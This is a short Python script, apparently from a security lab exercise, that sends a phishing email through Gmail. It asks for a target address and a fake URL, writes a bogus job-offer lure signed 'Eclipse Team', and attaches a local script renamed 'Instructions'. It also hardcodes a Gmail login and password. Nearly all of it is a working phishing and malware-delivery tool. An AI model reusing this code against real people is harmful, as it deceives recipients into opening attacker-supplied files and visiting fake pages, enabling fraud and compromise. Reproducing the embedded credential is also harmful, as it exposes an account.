#!/usr/bin/python


# Python code to illustrate Sending mail from 
# your Gmail account 
import sys
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

sender_email="cyber.attacker.test@gmail.com"
print("Welcome to a Phishing scam ")
rec_username=input(str("Please enter a username: "))
rec_email=input(str("Please enter mail service: "))
rec_title=input(str("Please enter a title: "))
rec_url=input(str("Please enter a fake url: "))
rec_url=rec_url
reciever_email=rec_username+"@"+rec_email

password="~4!4(8N'U(psM#`>"




msg2 = MIMEMultipart()
msg2['From'] = sender_email
msg2['To'] = reciever_email
msg2['Subject'] = rec_title

email_body = f"""\

Congratulations! We are currently looking for a {rec_title}.
Please read the attachment file before submitting your resume. 
Go to the page: <a href="{rec_url}">Sumbit your resume TODAY</a>
Thanks,
Eclipse Team.
"""
part = MIMEText(email_body, 'html')
msg2.attach(part)
filename = "Instructions"
attachment = open("/home/seed/Desktop/Cyber-Attack/script.py", "rb")  
p = MIMEBase('application', 'octet-stream')
p.set_payload((attachment).read())  
encoders.encode_base64(p)
p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
msg2.attach(p) 


message = MIMEText(email_body ,'html')

# creates SMTP session
s = smtplib.SMTP('smtp.gmail.com', 587)
  
# start TLS for security
s.starttls()
  
# Authentication
s.login(sender_email,password)
  
# message to be sent

  
# sending the mail
s.sendmail(sender_email,reciever_email, msg2.as_string())
print("Scam succesfully")
# terminating the session
s.quit()